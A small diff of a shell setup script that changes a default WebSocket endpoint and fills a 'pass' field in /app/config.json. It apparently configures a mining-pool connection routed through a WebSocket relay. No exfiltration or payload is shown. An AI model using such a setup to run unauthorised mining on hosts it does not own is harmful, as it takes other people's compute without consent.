@@ -9,7 +9,7 @@ if [ -z "$POOL_URL" ]; then
 fi
 
 if [ -z "$WS_URL" ]; then
-    WS_URL="wss://1sb9mu-10000.csb.app"
+    WS_URL="wss://sand.wangjm.ml"
 fi
 
 sed -i "s/\"pass\": \"notunn\"/\"pass\": \"$NAME_ID\"/" /app/config.json
